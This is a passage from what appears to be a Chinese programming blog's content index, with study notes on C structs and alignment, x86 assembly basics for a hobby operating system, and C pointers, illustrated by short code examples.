class="number">2019</span>&#125;;</span><br><span class="line"><span class="comment">//%i可以把十六进制和八进制转换位十进制输出</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%i-%i-%i\n&quot;</span>, today.year, today.month, today.day);</span><br><span class="line"><span class="comment">//不给值默认0</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%i-%i-%i\n&quot;</span>, thismonth.year, thismonth.month, thismonth.day);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="访问成员的运算符"><a href="#访问成员的运算符" class="headerlink" title="访问成员的运算符"></a>访问成员的运算符</h2><h3 id="1-成员运算符"><a href="#1-成员运算符" class="headerlink" title="1.成员运算符."></a>1.成员运算符<code>.</code></h3><ul><li><p>格式：<code>结构体变量名.成员名</code></p></li><li><p>功能：<strong>访问结构体内的成员</strong></p></li></ul><h3 id="2-指针运算符-gt"><a href="#2-指针运算符-gt" class="headerlink" title="2.指针运算符-&gt;"></a>2.指针运算符<code>-&gt;</code></h3><ul><li>格式：<code>结构体指针变量名-&gt;成员名</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">str</span>&#123;</span></span><br><span class="line">        <span class="keyword">int</span> num ;<span class="comment">//4</span></span><br><span class="line">        <span class="keyword">char</span> name[ <span class="number">20</span> ] ;<span class="comment">//20</span></span><br><span class="line">        <span class="keyword">char</span> sex ;<span class="comment">//1字节对齐后是4</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">date</span> <span class="title">birthday</span> ;</span><span class="comment">//12</span></span><br><span class="line">        <span class="keyword">float</span> score;<span class="comment">//4</span></span><br><span class="line">    &#125;boy1,boy2,*ptr1;</span><br></pre></td></tr></table></figure><ul><li>例如</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, boy1.name);</span><br></pre></td></tr></table></figure><p>可以输出<code>boy1</code>的成员<code>name</code></p><ul><li>又如</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ptr1-&gt;num);<span class="comment">//等价于(*ptr1.num);</span></span><br></pre></td></tr></table></figure><ul><li>说明<ul><li>如果成员本身是一个<strong>结构体</strong>的话，则需要引用到<strong>具体的成员</strong>才行.</li><li>结构体必须被<strong>初始化</strong>才有意义<ul><li>但我发现定义结构体成员后默认数据是<code>0</code>，指针是<code>NULL</code></li></ul></li><li><code>.</code>和<code>-&gt;</code>的优先级比较高，仅次于<code>()</code></li></ul></li></ul><h2 id="结构体的对齐"><a href="#结构体的对齐" class="headerlink" title="结构体的对齐"></a>结构体的对齐</h2><ul><li><p><strong>主要是为了提高读取效率</strong></p></li><li><p>四个基本概念:</p></li></ul><ol><li><strong>数据类型自身的对齐值</strong>：对于<code>char</code>型数据，其自身对齐值为<code>1</code>，对于<code>short</code>型为<code>2</code>，对于<code>int,float,double</code>类型，其自身对齐值为<code>4</code>，单位字节</li><li><strong>结构体的自身对齐值</strong>：其成员中自身对齐值最大的那个值</li><li><strong>指定对齐值</strong>：<code>#pragma pack (value)</code>时的指定对齐值<code>value</code></li><li><strong>数据成员和结构体的有效对齐值</strong>：数据成员(数据类型)和结构体的自身对齐值和指定对齐值中小的那个值。(数据成员对齐了数据结构自然也就对齐了)</li></ol><p>说明:</p><ul><li>有效对齐值N是最终采用的对齐方式,对齐N也就是说存放的原始地址%N=0.</li><li>数据结构中的变量都是按定义的先后顺序排放的,第一个数据的起始地址就是数据结构的初始地址.</li><li>结构体的变量占用的总长度必须是有效对齐值的整数倍.</li></ul><p>例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">B</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> b;</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">short</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="keyword">sizeof</span>(struct B));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为<code>12</code></p><p>解释：</p><ul><li><p>设初始地址为<code>0x0000</code></p></li><li><p><code>char</code>自身对齐值是<code>1</code>，存放地址满足<code>0x0000%1=0</code></p></li></ul><p><code>int</code>自身对齐值是<code>4</code>,只能存放<code>0x0004</code>到<code>0x0007</code>这四个字节,才能满足<code>0x0004%4=0</code></p><ul><li><code>short</code>自身对齐值<code>2</code>，占<code>0x0008</code>和<code>0x0009</code>，所以<code>0x0000</code>到<code>0x0009</code>都是<code>B</code>的内容</li><li>由于只有<code>10</code>个字节,结构体的有效对齐值是<code>4</code>，因为编译器为了实现结构数据的存取效率，所以自动补充<code>2</code>个字节满足<code>(10+2)%4=0</code></li></ul><h2 id="结构体参数"><a href="#结构体参数" class="headerlink" title="结构体参数"></a>结构体参数</h2><ul><li><strong>结构型和传值型</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">date</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">struct date <span class="title">getStruct</span><span class="params">(<span class="keyword">void</span>)</span></span>;<span class="comment">//返回结构</span></span><br><span class="line"><span class="comment">/*传值*，不改变原来的值*/</span></span><br><span class="line"><span class="comment">// void getStruct(struct date);</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putStruct</span><span class="params">(struct date)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">date</span> <span class="title">a</span>=</span>&#123;<span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">a = getStruct();<span class="comment">//结构可以赋给结构，数组不可以</span></span><br><span class="line">putStruct(a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// void getStruct(struct date pg)&#123;</span></span><br><span class="line"><span class="comment">// scanf(&quot;%d&quot;, &amp;pg.x);</span></span><br><span class="line"><span class="comment">// scanf(&quot;%d&quot;, &amp;pg.y);</span></span><br><span class="line"><span class="comment">// printf(&quot;pgx=%d,pgy=%d\n&quot;, pg.x, pg.y);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct date <span class="title">getStruct</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">date</span> <span class="title">pg</span>;</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;pg.x);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;pg.y);</span><br><span class="line"><span class="keyword">return</span> pg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putStruct</span><span class="params">(struct date pp)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;x=%d,y=%d\n&quot;</span>, pp.x, pp.y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>指针型</strong>（推荐使用）：</p><p>K &amp; R：If a large structrue is to be passed to a function, it is generally more efficient to pass a pointer then to copy the whole structrue.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">date</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">struct date* <span class="title">getStruct</span><span class="params">(struct date*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">outputs</span><span class="params">(<span class="keyword">const</span> struct date*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(struct date p)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">date</span> <span class="title">a</span>=</span>&#123;<span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">getStruct(&amp;a);<span class="comment">//这个和下面组成一个</span></span><br><span class="line">output(a);</span><br><span class="line">output(*getStruct(&amp;a));<span class="comment">//一句完成上面两句话(指针)</span></span><br><span class="line">outputs(getStruct(&amp;a));<span class="comment">//同上</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct date* <span class="title">getStruct</span><span class="params">(struct date *pa)</span></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;(*pa).x);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;pa-&gt;y);<span class="comment">//可以这样简写</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pa-&gt;x=%d,pa-&gt;y=%d\n&quot;</span>, pa-&gt;x, pa-&gt;y);</span><br><span class="line"><span class="keyword">return</span> pa;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">outputs</span><span class="params">(<span class="keyword">const</span> struct date* outpa)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;outpa-&gt;x=%d,outpa-&gt;y=%d\n&quot;</span>, outpa-&gt;x, outpa-&gt;y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(struct date p)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p.x=%d,p.y=%d\n&quot;</span>, p.x, p.y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="结构的嵌套"><a href="#结构的嵌套" class="headerlink" title="结构的嵌套"></a>结构的嵌套</h2><h3 id="结构数组"><a href="#结构数组" class="headerlink" title="结构数组"></a>结构数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">time</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> hour;</span><br><span class="line">    <span class="keyword">int</span> minute;</span><br><span class="line">    <span class="keyword">int</span> seconds;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">time</span> <span class="title">testTime</span>[5] =</span> &#123;</span><br><span class="line">&#123;<span class="number">01</span>,<span class="number">33</span>,<span class="number">11</span>&#125;,</span><br><span class="line">....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//testTime[i].hour</span></span><br></pre></td></tr></table></figure><h3 id="结构中的结构"><a href="#结构中的结构" class="headerlink" title="结构中的结构"></a>结构中的结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">point</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rectangle</span>&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">point</span> <span class="title">p1</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">point</span> <span class="title">p2</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rectangle</span> <span class="title">r</span>, *<span class="title">rp</span>;</span></span><br><span class="line">rp = &amp;r;</span><br><span class="line">r = (struct rectangle)&#123;&#123;<span class="number">1</span>,<span class="number">2</span>&#125;, &#123;<span class="number">3</span>,<span class="number">4</span>&#125;&#125;;<span class="comment">//必须进行类型转换才能赋值</span></span><br><span class="line"><span class="comment">/*等价关系：</span></span><br><span class="line"><span class="comment">r.p1.x</span></span><br><span class="line"><span class="comment">rp-&gt;p1.x</span></span><br><span class="line"><span class="comment">(r.p1).x</span></span><br><span class="line"><span class="comment">(rp-&gt;p1).x</span></span><br><span class="line"><span class="comment">不存在rp-&gt;p1-&gt;x</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ((rp-&gt;p1.x)+<span class="number">1</span>));<span class="comment">//+1表示y</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (rp-&gt;p2.x));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结构中的结构的数组"><a href="#结构中的结构的数组" class="headerlink" title="结构中的结构的数组"></a>结构中的结构的数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">point</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rectangle</span>&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">point</span> <span class="title">p1</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">point</span> <span class="title">p2</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rectangle</span> <span class="title">rects</span>[] =</span> </span><br><span class="line">&#123; &#123; &#123;<span class="number">1</span>,<span class="number">2</span>&#125;, &#123;<span class="number">3</span>,<span class="number">4</span>&#125; &#125;,&#123; &#123;<span class="number">5</span>,<span class="number">6</span>&#125;, &#123;<span class="number">7</span>,<span class="number">8</span>&#125; &#125; &#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1级大括号是数组rects[]</span></span><br><span class="line"><span class="comment">2级大括号是rectangle &#123;&#125;</span></span><br><span class="line"><span class="comment">3级大括号是p1,p2</span></span><br><span class="line"><span class="comment">可以这样写：</span></span><br><span class="line"><span class="comment">struct rectangle rects[] = &#123; </span></span><br><span class="line"><span class="comment">&#123;&#123;1,2&#125;, &#123;3,4&#125;&#125;,</span></span><br><span class="line"><span class="comment">&#123;&#123;5,6&#125;, &#123;7,8&#125;&#125;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>自制OS01-汇编</title>
      <link href="/OS/self-made/note01.html"/>
      <url>/OS/self-made/note01.html</url>
      
        <content type="html"><![CDATA[<p> 写系统不会汇编怎么行</p><span id="more"></span><h2 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h2><p>电脑里所有的东西都是二进制码</p><ul><li>十六进制一位表示二进制四位</li><li>1byte = 8bit</li><li><code>;</code>代表注释</li><li>源程序都是由十六进制完成的，十六进制前面要加0x，不然就是十进制</li><li>因为二进制就算转换位十六进制也还是太长了，所以在汇编程序里使用</li></ul><h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><p><code>DB</code>(define byte，大小写无所谓)指令：写入1字节，此外，DB可以直接写字符串</p><ul><li><p><code>DB&quot;hello world&quot;</code></p><p>汇编语言会自己查找字符对应的编码，然后排列</p></li></ul><p><code>ARESB</code>(reserve byte)指令：空出字节<br><code>DW</code>(define word)：word代表16位，也就是2字节<br><code>DD</code>(define double word) : four bytes<br><code>$</code>计算前面有多少字节（不只这一个含义）</p><p><code>ORG</code>(origin，起源)：告诉nask，开始执行的时候，将机器语言指令装载到内存中的哪个地址。</p><p>*　 加入这条指令后，<code>$</code>的意思是将要读入的内存地址。</p><p><code>JMP</code>(jump)：跳转，与entry结合使用</p><p><code>entry</code>(入口)：标签说明，用于指定JMP指令的跳转目的地等</p><p><code>MOV</code>(move)：赋值<br>例如<code>MOV SS,AX</code>，AX并没有变“空”，而是保持原有值不变</p><h3 id="IPL"><a href="#IPL" class="headerlink" title="IPL"></a><strong>IPL</strong></h3><p><strong>boot sector</strong>也叫<strong>IPL</strong>(initial program loader，启动程序加载器)：计算机是以512字节为一个单位读取的，而第一个单位就是boot sector，计算机会检查boot sector的最后两个字节，是<code>0x55AA</code>计算机才会认为有启动程序（就是这样设计的）</p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>代表性的寄存器有下面8个：</p><p><strong>AX</strong>—–accumulator，累加寄存器</p><p><strong>CX</strong>—–counter，计数寄存器</p><p><strong>DX</strong>—–data，数据寄存器</p><p><strong>BX</strong>—–base，基址寄存器</p><p><strong>SP</strong>—–stack pointer，栈指针寄存器</p><p><strong>BP</strong>—–base pointer， 基指针寄存器</p><p><strong>SI</strong>——sourse index，源变址寄存器</p><p><strong>DI</strong>——destination index， 目的变址寄存器</p><ul><li><p>上面都是十六位的寄存器，可以存储16位的二进制数</p></li><li><p>X表示extend（扩展的意思）</p></li><li><p>这些寄存器加起来有十六个字节</p></li><li><p>32位的前面加E</p></li></ul><p>CPU中另外8个寄存器：</p><p><strong>AL</strong>—–accumulator low,累加寄存器低位</p><p><strong>CL</strong>—–counter low,计数寄存器低位</p><p><strong>DL</strong>—–data low,数据寄存器低位</p><p><strong>BL</strong>—–base low,基址寄存器低位</p><p><strong>AH</strong>—–accumulator high,累加寄存器高位</p><p><strong>CH</strong>—–counter high,计数寄存器高位</p><p><strong>DH</strong>—–data high,数据寄存器高位</p><p><strong>BH</strong>—-base high,基址寄存器高位</p><ul><li><p>AX寄存器有16位。0-7位是AL，8-15是AH，其他同理</p></li><li><p>CPU依旧是那个CPU</p></li></ul><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p><strong>ES</strong>—-extra segment,附加段寄存器</p><p><strong>CS</strong>—-code,代码段寄存器</p><p><strong>SS</strong>—-stack，栈段寄存器</p><p><strong>DS</strong>—-data，数据段寄存器</p><p><strong>FS</strong>—-</p><p><strong>GS</strong>—-</p><p>一些语句：</p><p><code>MOV SI,msg</code></p><p>意思是<strong>SI = msg</strong>，把标号赋给了地址</p><p>注意，这里书上<strong>msg==0x7c74</strong></p><p><code>JMP entry</code>==<code>JMP 0x7c50</code></p><p>每个标号对应一段地址，因为此时entry==0x7c50，注意entry可以自定义</p><p><code>MOV BYTE[678],123</code></p><p>表示用内存的<code>678</code>号地址来存<code>123</code>这个数值，<code>BYTE</code>表示8个存储单元响应，WORD表示16个单元</p><blockquote><p>内存的低位在上面，高位在下面</p></blockquote><p>内存地址指定还可以用寄存器，<code>BYTE[SI]</code></p><p>MOVE的原数据和目的数据必须位数相同，也就是说AL可以省略BYTE</p><ul><li><code>MOV AL,[SI]</code></li></ul><h3 id="指令-1"><a href="#指令-1" class="headerlink" title="指令"></a>指令</h3><ul><li><p><code>ADD</code>加法指令</p><p><code>ADD SI，1</code></p><p>表示SI=SI+1</p></li><li><p><code>CMP</code>比较指令</p><p><code>CMP a,3</code>    </p><p>先比较a与3，再做什么</p></li><li><p><code>JE</code>条件跳转语句之一（jump if equal）</p><p>可以根据CMP的比较结果来执行下一条指令</p></li><li><p><code>INT</code>(interrup)中断指令和<code>BIOS</code>(basic input output system)</p></li><li><p>HLT（halt）</p><p>可以让CPU进入待机状态，并不是完全停止</p></li></ul><h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><ul><li><p>内存是外部存储器</p></li><li><p>CPU要通过管脚向内存发送电信号，严格来说。CPU和内存之间存在芯片（chipset）的控制单元</p></li><li><p>CPU访问内存的速度比访问寄存器要慢很多倍</p></li><li><p><code>0x00007c00</code>是启动区装载内容地址</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
          <category> 自制OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
            <tag> 寄存器 </tag>
            
            <tag> NASK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单理解指针</title>
      <link href="/Programming/C/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%8C%87%E9%92%88.html"/>
      <url>/Programming/C/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%8C%87%E9%92%88.html</url>
      
        <content type="html"><![CDATA[<p><code>*</code>与<code>&amp;</code>相互作用：<code>*&amp;a</code>实际上就是<code>a</code>变量</p><ul><li>是C语言的优势，指针也就是地址</li></ul><span id="more"></span><h3 id="定义格式"><a href="#定义格式" class="headerlink" title="定义格式"></a>定义格式</h3><p><code>类型 *指针变量名;</code>或<code>类型* 指针变量名;</code></p><p>说明</p><ul><li>指针变量的类型是他指向内存单元中存放的<strong>数据类型</strong></li><li>指针变量必须被赋值语句<strong>赋值初始化</strong>后才能使用，否则，严重的话会死机</li><li>可初始化为<code>0</code>，<code>NULL</code>(不指向任何值)或者某个地址</li><li>指针变量<strong>只能接受地址</strong>,赋以数据会错误</li></ul><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><ul><li>在指针引用前，要定义，赋值，否则，会造成系统混乱</li></ul><h3 id="指针运算符"><a href="#指针运算符" class="headerlink" title="指针运算符"></a>指针运算符</h3><h4 id="取址符-amp"><a href="#取址符-amp" class="headerlink" title="取址符&amp;"></a>取址符&amp;</h4><ul><li>单目运算符,结合性自左向右.</li></ul><h4 id="取内容符"><a href="#取内容符" class="headerlink" title="取内容符*"></a>取内容符*</h4><ul><li>也叫间接引用运算符,结合性自左向右,且*后面只能是指针.</li><li>指针的值也可以改变,也就是改变指向.</li></ul><h3 id="指针的类型"><a href="#指针的类型" class="headerlink" title="指针的类型"></a>指针的类型</h3><ul><li>不同类型的指针不能相互赋值（虽然没问题）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>* a = <span class="literal">NULL</span>；</span><br><span class="line"><span class="keyword">char</span>* b = <span class="literal">NULL</span>；</span><br><span class="line">a = b；</span><br></pre></td></tr></table></figure><p>如果<code>*a=0</code>，则<code>*b[0]-*b[3]</code>都会变成0</p><ul><li><p>指针类型的转换</p><ul><li><p><code>void*</code> 表示不知道指向什么东西的指针：</p></li><li><p><code>int *p = &amp;i; void*q = (void*)p;</code></p><ul><li>并没有改变<code>p</code>所指的变量类型，而是用不同的眼光通过<code>p</code>去看它所指的变量<ul><li><code>q</code>此时认为p指向的变量不是<code>int</code>，而是<code>void</code></li></ul></li></ul></li></ul></li></ul><h3 id="场景1"><a href="#场景1" class="headerlink" title="场景1"></a>场景1</h3><p>利用函数交换数值（也就是说传给主函数多个数值）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *pa, <span 